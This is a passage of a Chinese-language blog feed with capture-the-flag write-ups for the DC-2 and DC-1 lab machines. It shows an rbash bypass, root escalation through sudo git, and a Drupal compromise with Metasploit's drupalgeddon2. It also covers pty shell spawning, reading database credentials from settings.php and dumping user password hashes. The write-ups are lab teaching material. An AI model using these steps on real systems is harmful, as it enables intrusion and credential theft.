href="https://www.freebuf.com/vuls/376922.html%EF%BC%88Linux%E6%8F%90%E6%9D%83%E4%B9%8Brbash%E7%BB%95%E8%BF%87%EF%BC%89">https://www.freebuf.com/vuls/376922.html（Linux提权之rbash绕过）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> -p   // 查看环境变量<br><br>BASH_CMDS[a]=/bin/sh;a  // 把/bin/sh;a这个值赋值给目标数组位置<br><br>执行 /bin/bash 命令 // 退出返回当前普通tom用户<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin  // 添加环境变量<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin // 添加环境变量<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629211244365.png" alt="image-20240629211244365"></p><p>添加完环境变量后，<code>ls</code>查看当前目录内容，<code>compgen -c</code>查看当前支持的指令。</p><p>结果显示出了绕过之前<code>compgen -c</code>所没有的很多命令，说明rbash绕过成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212249196.png" alt="image-20240629212249196"></p><p>尝试<code>sudo su</code>提权，但结果还是没能成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212501959.png" alt="image-20240629212501959"></p><p>因此需要继续提权。再仔细查看绕过后系统允许的命令，发现有<code>find</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212610412.png" alt="image-20240629212610412"></p><p>我们上一个靶场利用<code>find</code>命令成功进行了提权，那这次也一样捏！</p><p>首先利用find命令，查看具有SUID权限的可执行二进制文件（命令）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212859976.png" alt="image-20240629212859976"></p><p>发现好像没啥文件可利用。而上一个靶场中<code>find</code>命令也具有SUID权限。</p><p>尝试切换用户！切换到 jerry账户 ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su &lt;用户名jerry&gt;  // 然后输入jerry的密码即可<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214309315.png" alt="image-20240629214309315"></p><p><code>sudo -l</code>查看sudo的配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214442931.png" alt="image-20240629214442931"></p><p>可以得到的信息是，<code> (root) NOPASSWD: /usr/bin/git</code>git命令是root权限的。</p><p><strong>git命令可以实现提权</strong></p><blockquote><p>方法一：</p><p>sudo git help config</p><p>!&#x2F;bin&#x2F;bash 或 !’sh’</p><p>方法二：</p><p>sudo git -p help</p><p>!&#x2F;bin&#x2F;bash </p></blockquote><p>首先先再用户命令行界面输入 <code>sudo git help config</code>，然后他会跳转到一个文件处，什么都不用管，直接复制<code>!/bin/bash 或 !&#39;sh&#39;</code>然后回车。</p><p>可以发现，现在已经是root用户了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220012985.png" alt="image-20240629220012985"></p><p>但是执行<code>ls</code>的时候可以发现，当前目录下仍然只有 flag3 这个文件。根据命令行显示提示，我们是在root下的 &#x2F;home&#x2F;tom目录 执行的 ls 命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629215624770.png" alt="image-20240629215624770"></p><p>执行两次 <code>cd ..</code>退回到 root 根目录。然后再执行一次 ls命令，可以得到<code> final-flag.txt</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220312912.png" alt="image-20240629220312912"></p><p>提权成功！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>第一步工作就是确认目标靶机的IP地址。通过开关靶机或者nmap扫描实现</p></li><li><p>第二步工作就是进行端口扫描，扫描开放端口，试图从中获取一些有用的信息</p></li><li><p>第三步工作就是尝试进行目录爆破。到这一步为止的步骤和dc-1的步骤类似</p></li><li><p>通过<strong>指纹工具</strong>识别出网站使用的框架是<strong>wordpress</strong>，这类框架的漏洞常可以使用<strong>wpscan</strong>进行扫描。使用<strong>wpscan</strong>进行用户名信息扫描。</p></li><li><p>根据<strong>flag提示</strong>得知可以使用<strong>cewl</strong> ，使用其可以针对特定域名（URL）进行密码爆破字典生成。</p></li><li><p>有了<strong>密码字典</strong>以及<strong>用户名信息</strong>之后使用<strong>wpscan</strong>进行有效用户账户的爆破。</p></li><li><p>通过SSH连接来<strong>Getshell</strong>。通过利用可以使用的命令来进行提权，当仍有命令限制的时候，无法获取root权限的时候尝试使用<strong>rbash绕过</strong>来进行提权。</p></li><li><p>切换用户，查看sudo配置信息，试图获取有用信息，<strong>利用命令进行提权</strong>。最后进入root目录查看文件获取最后一个flag。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/07/24/DC-1/"/>
    <url>/2024/07/24/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a><strong>DC-1</strong></h1><p>首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。</p><h2 id="靶机IP地址确认"><a href="#靶机IP地址确认" class="headerlink" title="靶机IP地址确认"></a>靶机IP地址确认</h2><p><strong>（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png" alt="img"></p><p>在kali中进行地址段扫描：（nmap扫描法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>扫描得到的结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png" alt="img"></p><p>对比mac地址，得到了靶机的IP地址。其他的地址扫描方法以及得到的效果如下：<br>p1：（arp-scan扫描）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png" alt="img"></p><p>p2：（netdiscover扫描 – 速度很慢）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png" alt="img"></p><p><strong>（2） 也可以通过开关靶机扫描来确定靶机的IP地址</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p> 关闭靶机时，扫描得到的结果：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png" alt="img"></p><p>打开（或挂起）靶机时，扫描得到的结果：</p><p>会发现多了一个IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png" alt="img"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>（1）扫描目标靶机IP的开放端口</strong></p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-p </code>： 指定扫描端口，<code>-p- </code>指的是从1到65535端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png" alt="img"></p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png" alt="img"></p><p>根据结果可以看到，开放的端口有<code>22、80、111、51393</code></p><p><strong>（2）扫描开放端口的具体信息</strong></p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png" alt="img"></p><p>通过80端口呈现出来的信息可以知道，它是一个Drupal网站。</p><p>什么是Drupal呢？通过网上查询，可以知道：</p><table><thead><tr><th align="left">Drupal是一个开源的CMS框架，是一个基于LAMP技术栈的CMS框架，它允许通过安装和卸载模块的方式添加和移除功能。CMS（内容管理系统）是一种软件，允许用户使用各种智能产品中的web浏览器访问网站，添加、发布、编辑和删除内容。</th></tr></thead></table><p>通过<code>searchsploit</code>命令搜索，可以查找到CMS框架的漏洞。</p><table><thead><tr><th align="left">searchsploit是一个用于Exploit-DB的命令行搜索工具。许多漏洞都包含了二进制文件的链接，这些文件不包含在存储库中，但可以在Exploit-DB二进制文件中找到。</th></tr></thead></table><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal cms<br>searchsploit drupal<br></code></pre></td></tr></table></figure><p>得到如下扫描结果：</p><p>可以看到这类cms框架的漏洞不少。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png" alt="img"></p><p>使用浏览器访问靶机IP，显示为一个Drupal网页：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png" alt="img"></p><p>再次查看扫描得到的端口信息，可以得知80端口服务器下的文件目录，其中有一个<code>install.php</code>的文件，选择它的原因呢，命名是install，下载文件，如果可以自己重新下载一个，并修改其中的参数，也许下载得到的效果就不一样了（&#x2F;doge）。</p><p>使用浏览器访问该文件，在上述网站网址后面加上<code>/install.php</code>。如下，可以看到一些信息，比如第二个提示”若想下载一个不同的数据库，需要在sites文件夹中适当编辑setting.php文件”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png" alt="img"></p><h2 id="扫描常见UDP端口"><a href="#扫描常见UDP端口" class="headerlink" title="扫描常见UDP端口"></a>扫描常见UDP端口</h2><p><code>--top-ports  n</code>   ： 扫描最常用的n个端口。</p><p>对靶机IP地址进行扫描，扫描其中最常见的20个UDP端口，查看其开放状态，保存信息备用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png" alt="img"></p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><p>对靶机进行nmap漏扫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><blockquote><p>nmap -script&#x3D;vuln -p 是使用Nmap运行漏洞脚本扫描的命令。</p><p>其中“-script&#x3D;vuln”告知nmap要运行漏洞脚本扫描</p></blockquote><p>扫描结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png" alt="img"></p><p>首先会显示目标主机的IP地址（nmap scan report for targetIP）</p><p>然后会显示扫描过程中检测到的开放的端口号（port    state    service）</p><p>下一个项目就是显示漏洞的检测结果，对于每个开放的端口，显示是否发现了与该端口相关的已知漏洞。如上图扫描结果，关于80端口的漏洞不少。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><table><thead><tr><th align="left">gobuster是一个用于在网站目录或者文件中进行快速且有效的字典攻击工具。它可以帮助发现目标网站中隐藏的路径。执行的功能有：目录扫描、子域名扫描、文件扩展名扫描、多线程支持、结果报告。多用于渗透测试和安全审计中。</th></tr></thead></table><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明待输入的待扫描的网站</p><p><code>-w</code>：指明字典文件的路径</p><p><code>dir</code>：表示使用目录&#x2F;文件枚举模式</p><p>鉴定为：爆破过程太久了啊<del>，不如直接利用漏洞</del></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png"></p><p><strong>gobuster常使用的命令和标志：</strong></p><ul><li><p>命令（模式）</p><p><strong>completion</strong>：为指定的shell生成自动完成脚本<br><strong>dir</strong>：使用目录&#x2F;文件枚举模式<br><strong>dns</strong>：使用DNS子域枚举模式<br><strong>fuzz</strong>：使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br><strong>gcs</strong>：使用gcs bucket枚举模式<br><strong>help</strong>：获取任何命令的帮助信息<br><strong>s3</strong>：使用aws bucket枚举模式<br><strong>tftp</strong>：使用TFTP枚举模式<br><strong>version</strong>：显示当前版本<br><strong>vhost</strong>：使用VHOST枚举模式（您很可能想在URL参数中使用IP地址）</p></li><li><p>标志（全局参数）</p><p><strong>–debug</strong>：启用调试输出<br><strong>–delay duration</strong>：每个线程在请求之间的等待时间（例如1500ms）<br><strong>-h, –help</strong>：获取gobuster的帮助信息<br><strong>–no-color</strong>：禁用彩色输出<br><strong>–no-error</strong>：不显示错误<br><strong>-z, –no-progress</strong>：不显示进度<br><strong>-o, –output string</strong>：写入结果的输出文件（默认为stdout）<br><strong>-p, –pattern string</strong>：包含替换模式的文件<br><strong>-q, –quiet</strong>：不打印横幅和其他无关信息<br><strong>-t, –threads int</strong>：并发线程的数量（默认为10）<br><strong>-v, –verbose</strong>：详细输出（错误）<br><strong>-w, –wordlist string</strong>：指向字典文件的路径。设置为-以使用STDIN。<br><strong>–wordlist-offset int</strong>：从字典文件中的指定位置恢复（默认为0）<br>（原文链接：<a href="https://blog.csdn.net/weixin_70137901/article/details/134613324%EF%BC%89">https://blog.csdn.net/weixin_70137901/article/details/134613324）</a></p></li><li><p>gobuster使用基本语法</p><p><strong>目录扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w 选择一个字典 -u 输入要扫描的网站 -x 扫描的文件类型 -t 线程数量<br></code></pre></td></tr></table></figure><p><strong>子域名扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d 域名 -w 字典<br></code></pre></td></tr></table></figure></li></ul><h2 id="Drupal-CMS漏洞查找"><a href="#Drupal-CMS漏洞查找" class="headerlink" title="Drupal CMS漏洞查找"></a>Drupal CMS漏洞查找</h2><p>使用Metasploit查询该CMS漏洞并进行测试。</p><table><thead><tr><th align="left">Metasploit是一款开源渗透测试框架，可以进行信息收集、漏洞扫描、漏洞利用和后渗透攻击。提供了Payload生成器用于生成各种类型的恶意代码，如shellcode、Trojan程序等。还可以通过编写脚本自动化渗透测试过程。</th></tr></thead></table><p>首先打开工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入命令：msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png" alt="img"></p><p>输入命令查找Drupal CMS漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png" alt="img"></p><p>根据查询结果，可以得知这个Drupal CMS框架还是有蛮多漏洞的。Rank表示漏洞等级。此处利用漏洞等级较高且时间最新的2018年的漏洞。</p><blockquote><p> exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png" alt="img"></p><p>查看该漏洞模块的参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png" alt="img"></p><p>其中，<code>Current Setting </code>是目前设置的内容，<code>Required</code>表示是否需要设置内容，yes为必须，no为可选。</p><p>然后可以看到有一个<code>RHOSTS</code>项目，重置HOST，设置为必须设置。因而接下来需要设置RHOSTS的内容，即攻击目标IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.129<br></code></pre></td></tr></table></figure><p>然后再查看一下模块的参数，确认设置完成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png" alt="img"></p><p>然后执行run&#x2F;exploit命令开始攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run/exploit<br></code></pre></td></tr></table></figure><p>出现如下提示信息表明攻击成功！</p><p><code>Meterpreter session 1 opened </code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png" alt="img"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>利用漏洞攻击目标主机成功之后就可以Getshell获取权限了。</p><h3 id="1、获取普通shell"><a href="#1、获取普通shell" class="headerlink" title="1、获取普通shell"></a>1、获取普通shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png" alt="img"></p><p>然后在上述光标处输入并执行ls命令，获取目标目录下的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png" alt="img"></p><p>通过执行命令可以判断所得到的权限级别：</p><blockquote><p>一般来说，对于用户类型的ID分配为：</p><p>①系统管理员id&#x3D;0；②普通用户id&#x3D;1~65535。</p><p>而且当所获取的权限为系统管理员权限时，执行 <code>whoami</code>显示的用户名是root。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png" alt="img"></p><p>显然，这里获取的权限是普通用户的权限。尽管只是普通权限， 但我们仍可以通过这些普通权限去获取别的信息。</p><p>- </p><p><strong>使用命令测试是否提权成功，就是切换用户到靶机用户，得到如下效果：</strong></p><p><strong>Pay：这个操作是必要的，不然会导致提权被迫失败。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 利用python的‘pty’模块来生成一个交互式的bash shell<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png" alt="img"></p><p>- </p><p>比如，使用cat命令看看flag1.txt文件（上述执行ls获得的目录列表文件之一）的文件内容是什么：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png" alt="img"></p><p>继而搜索其他flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name flag*<br></code></pre></td></tr></table></figure><p>结果显示只有flag1.txt了捏：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png" alt="img"></p><p>下一步要干什么呢？通过网路查询Drupal CMS的配置文件一般叫什么，以它为切入口。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png" alt="img"></p><p>经过查询得知，Drupal的配置文件一般叫settings.php，因而找出所有<code>*settings.php</code>文件出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png" alt="img"></p><p>一共找到了三个捏。根据文件名，第一个文件大概率是主题相关的，可以先查看后面两个文件。</p><blockquote><p>&#x2F;var&#x2F;www&#x2F;themes&#x2F;garland&#x2F;theme-settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;default.settings.php</p></blockquote><p>先查看第二个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png" alt="img"></p><p>直接就得到了数据库的相关信息，包括用户名和密码等。与此同时也得到了flag2的相关提示信息。</p><p>继续查看第三个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/default.settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png" alt="img"></p><p>多为注释，没啥实质性有用的信息。</p><p>根据第二个文件获取到的数据库相关信息，尝试登陆数据库，查看其中的数据。并尝试获取登陆的<code>用户名</code>和<code>密码</code>：</p><p>- </p><p>使用MYSQL命令之前需要先确保它的服务已经开启，并且已经启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status mysql    // 检查状态<br>systemctl start mysql     // 启动服务<br></code></pre></td></tr></table></figure><p>未开启服务的时候返回的响应信息如果指向的是MariaDB服务未启动。</p><p>使用命令设置MariaDB自启动：（系统下次启动时就会自动启动它）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure><p>- </p><p>尝试执行数据库登陆命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure><p>用户名是<code>dbuser</code></p><p>密码是<code>R0ck3t</code></p><p>返回响应信息如下，表示成功登陆了数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png" alt="img"></p><p>查看数据库的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show databases;<br>（分号是必须要加的）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png" alt="img"></p><p>有两个数据库，一个是记录当前数据库系统中所有元数据的记录文件，另一个是drupaldb数据库。</p><p>接下来查看数据库中的表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br><br>show tables;<br><br></code></pre></td></tr></table></figure><p>注意，分号也是需要的哦。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png" alt="img"></p><p>根据表名，我们可以发现数据库中含有一个表名为<code>user</code>的表，里面应该会有一些信息。</p><p>接下来查看该表的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png" alt="img"></p><p>其中的name应该表示的是用户名，pass表示的是对应的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png" alt="img"></p><p>但是细看pass，都是经过加密保护的数据：</p><blockquote><p>数据库中的密码一般采用的是hash加密。因此关于数据库加密密码的破解可以通过一些hash加密脚本进行切入。</p></blockquote><p>输入命令：（需要先退出，切换为交互界面哦~）</p><p>退出后的切换命令：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p>查询得到的结果很多：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png" alt="img"></p><p>通过查看文件命名，可以发现存在一个名为：<code>password-hash.sh</code>的文件，初步判断其应该是我们要找的hash加密脚本。读取该脚本寻找其使用方法。</p><blockquote><p>.sh后缀的文件一般是shell脚本文件。用于在linux系统中执行一些自动化任务或者命令序列。</p></blockquote><p>读取加密脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/scripts/password-hash.sh<br></code></pre></td></tr></table></figure><p>得到结果（一些关键信息如下）：</p><p>比如，使用说明和帮助信息：支持‘–root’选项，用于将工作目录切换到drupal安装目录。所有的明文密码都必须使用双引号括起来。</p><p>“ One or more 